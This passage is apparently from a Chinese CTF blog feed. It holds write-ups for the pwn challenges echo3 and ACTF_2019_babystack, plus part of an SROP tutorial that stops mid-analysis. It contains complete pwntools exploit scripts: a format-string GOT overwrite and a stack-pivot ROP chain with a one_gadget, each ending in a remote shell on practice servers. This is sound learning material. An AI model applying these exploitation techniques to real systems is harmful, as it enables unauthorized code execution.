class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so.i386'</span>)</span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(system &amp; <span class="number">0xffff</span>,<span class="number">20</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system &amp; <span class="number">0xffff</span>) ,<span class="number">21</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="3月19号下午针对echo3的新更新……"><a href="#3月19号下午针对echo3的新更新……" class="headerlink" title="3月19号下午针对echo3的新更新……"></a>3月19号下午针对echo3的新更新……</h1><p>晚上做梦梦到好像有人告诉我这道题应该用LibcSearcher来弄libc…试了一下…果然可以!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25796</span>)</span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,libc_start_main)</span><br><span class="line">libcbase = libc_start_main - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.symbols['__libc_start_main']</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="comment">#system = libcbase + libc.symbols['system']</span></span><br><span class="line">system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(system &amp; <span class="number">0xffff</span>,<span class="number">20</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system &amp; <span class="number">0xffff</span>) ,<span class="number">21</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319175220.png" alt></p><p>libc选的这个</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.cnblogs.com/ZHijack/p/8687182.html" target="_blank" rel="noopener">博客园</a></p><p><a href="https://www.aloxaf.com/2018/07/hackme_inndy/#echo2" target="_blank" rel="noopener">传送门</a></p><p><a href="https://xz.aliyun.com/t/3700#toc-7" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/9329387.html" target="_blank" rel="noopener">Freebuf</a></p><p><a href="https://xz.aliyun.com/t/7110#toc-18" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://www.jianshu.com/p/76152d477322" target="_blank" rel="noopener">简书</a></p><p><a href="https://www.lyyl.online/2019/10/24/HackMe%E4%B8%AD%E7%9A%84echo3/" target="_blank" rel="noopener">传送门</a></p><p><a href="https://carlstar.club/2019/01/02/echo3/#idea" target="_blank" rel="noopener">传送门</a></p><hr><p>和指定libc有关的参考链接</p><p><a href="https://blog.csdn.net/think_ycx/article/details/78005083" target="_blank" rel="noopener">CSDN</a></p><p><a href="http://www.jx-zhang.xyz/2018/01/13/fmtstr" target="_blank" rel="noopener">传送门</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm" target="_blank" rel="noopener">陈老板的看雪文章</a></p><p><a href="https://github.com/NixOS/patchelf" target="_blank" rel="noopener">patchelf</a></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/74006495_p0.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/72707136_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>[栈迁移]ACTF_2019_babystack</title>
    <link href="http://liul14n.top/2020/03/14/%E6%A0%88%E8%BF%81%E7%A7%BB-ACTF-2019-babystack/"/>
    <id>http://liul14n.top/2020/03/14/栈迁移-ACTF-2019-babystack/</id>
    <published>2020-03-14T08:28:06.000Z</published>
    <updated>2020-03-28T16:58:27.131Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/79755722_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>题目考察点:<code>栈迁移</code>、<code>ROP</code>、<code>ret2leave</code></p><p>题目来源:<code>BUUCTF</code></p><p>写这篇博客为了记录一下栈迁移的用法。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200314163239.png" alt></p><p>程序最大可以读入0xE0字节的数据，而s与rbp的距离为0xD0，所以还可以溢出0xE0-0xD0 = 0x10个字节的数据，但是这0x10<code>只够覆盖rbp和返回地址</code>。</p><p>程序会把栈地址打印出来。</p><p><strong>程序开了NX保护，无法往栈上写入shellcode来执行</strong></p><p>所以考虑<code>栈迁移</code>，然后构造<code>ROP链</code>。</p><h1 id="0x02-EXP与解释"><a href="#0x02-EXP与解释" class="headerlink" title="0x02 EXP与解释"></a>0x02 EXP与解释</h1><p>这道题比较简单，直接放EXP了，一些关键点会解释一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./babystack')</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28934</span>)</span><br><span class="line">main = <span class="number">0x4008F6</span></span><br><span class="line">leave = <span class="number">0x400A18</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400ad3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendMsg</span><span class="params">(payload)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    c.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">    c.recvuntil(<span class="string">'Your message will be saved at '</span>)</span><br><span class="line">    addr = int(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">'stack_addr = '</span> + hex(addr))</span><br><span class="line">    payload += <span class="string">'a'</span>*(<span class="number">0xd0</span> - len(payload)) + p64(addr) + p64(leave)</span><br><span class="line">    c.recvline()</span><br><span class="line">    c.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    c.send(payload)<span class="comment">#注意这里要send，不能用sendline，不然程序接收和发送不匹配！！！！</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(main)</span><br><span class="line"></span><br><span class="line">sendMsg(payload)</span><br><span class="line">c.recvuntil(<span class="string">'Byebye~\n'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',puts_addr)</span></span><br><span class="line"><span class="comment">#libcbase = puts_addr - libc.dump('puts')</span></span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">execv = libcbase + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p64(execv)</span><br><span class="line">sendMsg(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>由于题目并没有给libc，可以考虑用LibcSearcher(实际上libc就是libc-2.27.so)</p><p>来看第一个payload，关于它的执行流程，可以看下面:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">read之前</span><br><span class="line"> RBP  <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400a70</span> ◂— <span class="number">0x41ff894156415741</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">call read: rbp里面的内容被覆盖为程序打印出的栈地址，也就是s的首地址</span><br><span class="line"> RBP  0x7fffffffdd90 —▸ 0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"></span><br><span class="line">leave(程序自身的leave，位于<span class="number">0x400A18</span>)，mov rsp,rbp;pop rbp（使得rsp+=<span class="number">8</span>，指向了我们的p64(leave)）</span><br><span class="line"> RBP  0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  <span class="number">0x7fffffffdd98</span> —▸ <span class="number">0x400a18</span> ◂— <span class="number">0x8348e5894855c3c9</span></span><br><span class="line"></span><br><span class="line">ret(程序自身的ret，位于<span class="number">0x400A19</span>)，将我们传入的p64(leave)传给rip，rsp+=<span class="number">8</span>，接着执行leave;ret。</span><br><span class="line"> RBP  0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  <span class="number">0x7fffffffdda0</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">leave(我们的p64(leave)),mov rsp,rbp;pop rbp; 此时rsp又指向了s首地址+<span class="number">8</span>的位置，即p64(pop_rdi_ret)</span><br><span class="line"> RBP  0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  <span class="number">0x7fffffffdcc8</span> —▸ <span class="number">0x400ad3</span> ◂— <span class="number">0x841f0f2e6690c35f</span></span><br><span class="line"></span><br><span class="line">ret(我们传入的)，pop rdi;将p64(pop_rdi_ret)传给rip</span><br><span class="line"> RBP  0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  <span class="number">0x7fffffffdcd0</span> —▸ <span class="number">0x601020</span> —▸ <span class="number">0x7ffff7a649c0</span> (<span class="built_in">puts</span>) ◂— push   r13</span><br><span class="line"></span><br><span class="line">此时 RIP -- &gt; pop_rdi_ret，从而执行我们的ROP链</span><br></pre></td></tr></table></figure><p><strong>有的博主把这块构造叫做<code>ret2leave</code></strong></p><p>关于第二个payload，我试过通过rop链构造<code>system(&#39;/bin/sh&#39;)</code>但是打不通，所以这里采用<code>one_gadget</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200314172353.png" alt></p><p>这里选用的第一个<code>0x4f2c5</code>，然后老样子构造payload即可。</p><h1 id="0x03-写在最后"><a href="#0x03-写在最后" class="headerlink" title="0x03 写在最后"></a>0x03 写在最后</h1><p>这道题目不难，关键是理解这个栈迁移的原理和<code>ret2leave</code>的执行流程。</p><p>可以总结一下:</p><p>leave相当于 <code>rsp = rbp + 8; rbp = [rbp];</code></p><p>为了达到我们的目的(让rsp指向 rbp里面的值+8的位置)，一次leave是不够的，所以本题需要两次，才能使得<code>rsp = [rbp] + 8</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/79755722_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>通过三道题目学习SROP技术</title>
    <link href="http://liul14n.top/2020/03/11/%E9%80%9A%E8%BF%87%E4%B8%89%E9%81%93%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0SROP%E6%8A%80%E6%9C%AF/"/>
    <id>http://liul14n.top/2020/03/11/通过三道题目学习SROP技术/</id>
    <published>2020-03-11T13:55:13.000Z</published>
    <updated>2020-10-07T07:06:10.288Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/32387154_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很久之前就听大佬说过SROP了，前几天也通过SROP技术做出来一道题目，不过是看的别人WP之后才会的。</p><p>今天具体学习了一下SROP技术，先贴几个参考链接:</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_12" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">FreeBuf</a></p><blockquote><p>需要注意的是，pwntools中的SigreturnFrame中并不需要填写rt_sigreturn的地址，我们只需要确保执行rt_sigreturn的时候栈顶是SigreturnFrame就行。</p></blockquote><p>形如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,<span class="number">15</span>;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure><p>这种可以直接send(str(frame))</p><p>但形如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">syscall(<span class="number">15L</span>L, &amp;buf);</span><br></pre></td></tr></table></figure><p>这种需要send(str(frame)[8:])</p><p>前八个是调用rt_sigreturn函数的 ?</p><p>本文通过三道题目来练习这项技术，题目按照顺序来的<del>层层递进</del></p><h1 id="0x01-Ciscn-2019-s-3"><a href="#0x01-Ciscn-2019-s-3" class="headerlink" title="0x01 Ciscn_2019_s_3"></a>0x01 Ciscn_2019_s_3</h1><p>这道题目也就是我刚刚说过的通过别人的WP第一次了解SROP并用这技术做出来的题目。</p><p><strong>这道题目的特点在于</strong></p><ol><li>题目已经给了<code>mov rax,59(对应execve系统调用)</code>、<code>mov rax,15(对应sigreturn系统调用)</code></li><li>SROP能够利用到的gadgets是<code>syscall; ret</code></li></ol><p>因为之前我已经专门更过这道题的博客了，所以这里直接放链接</p><p><a href="http://liul14n.top/2020/03/07/Ciscn-2019-s-3/">传送门</a></p><h1 id="0x02-smallest-pwn"><a href="#0x02-smallest-pwn" class="headerlink" title="0x02 smallest pwn"></a>0x02 smallest pwn</h1><p>这是CTF-WIKI上面给的一道例题。</p><p><strong>这道题目的特点是</strong></p><ol><li>程序非常小，由汇编语言写成</li><li>相比上一道题目，没有给出<code>mov rax,59</code>或者<code>mov rax,15</code></li><li>需要通过程序的read系统调用的读入字节数来设置rax的值。</li><li>SROP能够利用的gadgets是<code>syscall;ret</code></li></ol><p>这道题目有一个博主已经讲解的非常详细了，而且最后这位博主画的流程图很直观，我再写也只能是模仿，很难再超越了。这里直接给出链接了</p><p><a href="https://www.jianshu.com/p/b838a10b63c7" target="_blank" rel="noopener">简书</a></p><h1 id="0x03-rootersctf-2019-srop"><a href="#0x03-rootersctf-2019-srop" class="headerlink" title="0x03 rootersctf_2019_srop"></a>0x03 rootersctf_2019_srop</h1><p>这是BUUCTF上的一道题目</p><p><strong>这道题的特点是</strong></p><ol><li>程序非常小，由汇编语言写成</li><li>依然没有<code>mov rax,59</code>或者<code>mov rax,15</code></li><li>存在<code>pop rax</code></li><li>能够利用的gadgets是<code>pop rax;syscall;leave;ret</code>和<code>syscall;leave;ret</code>（可以注意到相比前两道题目，syscall和ret之间多了一个leave</li></ol><h2 id="0x001-分析"><a href="#0x001-分析" class="headerlink" title="0x001 分析"></a>0x001 分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>程序只开了NX保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401000 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 ; Attributes: bp-based frame</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 sub_401000      proc near               ; CODE XREF: start↓p</span><br><span class="line">.text:0000000000401000                                         ; DATA XREF: LOAD:0000000000400088↑o</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 buf             = byte ptr -80h</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000                 push    rbp</span><br><span class="line">.text:0000000000401001                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401004                 sub     rsp, 40h</span><br><span class="line">.text:0000000000401008                 mov     eax, 1</span><br><span class="line">.text:000000000040100D                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000401012                 lea     rsi, buf        ; &quot;Hey, can i get some feedback for the CT&quot;...</span><br><span class="line">.text:000000000040101A                 mov     edx, 2Ah        ; count</span><br><span class="line">.text:000000000040101F                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000401021                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401026                 lea     rsi, [rsp+40h+buf] ; buf</span><br><span class="line">.text:000000000040102B                 mov     edx, 400h       ; count</span><br><span class="line">.text:0000000000401030                 push    0</span><br><span class="line">.text:0000000000401032                 pop     rax</span><br><span class="line">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000401035                 leave</span><br><span class="line">.text:0000000000401036                 retn</span><br><span class="line">.text:0000000000401036 sub_401000      endp</span><br><span class="line">.text:0000000000401036</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037 ; Attributes: noreturn</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037                 public start</span><br><span class="line">.text:0000000000401037 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401037                 call    sub_401000</span><br><span class="line">.text:000000000040103C                 mov     eax, 3Ch</span><br><span class="line">.text:0000000000401041                 mov     edi, 0          ; error_code</span><br><span class="line">.text:0000000000401046                 syscall                 ; LINUX - sys_exit</span><br><span class="line">.text:0000000000401046 start           endp</span><br><span class="line">.text:0000000000401046</span><br><span class="line">.text:0000000000401046 _text           ends</span><br><span class="line">.text:0000000000401046</span><br></pre></td></tr></table></figure><p>程序只有两个函数，一个是调用了write和read的函数，另一个是调用exit的函数。</p><p>很明显可以看到read处存在栈溢出，可以用SROP来做。</p><h2 